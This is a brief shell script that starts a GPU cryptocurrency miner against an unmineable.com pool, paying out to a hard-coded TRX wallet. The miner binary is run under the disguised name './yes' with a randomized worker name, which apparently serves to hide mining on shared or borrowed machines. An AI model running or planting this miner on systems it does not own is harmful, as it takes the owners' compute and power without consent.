POOL=rx-us.unmineable.com:3333
WALLET=TRX:TL3TCWQXJiozBM3hZVhg2BiPh4NsbgzHpm
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo aKuH3VBL-$(shuf -i 1211-849819 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
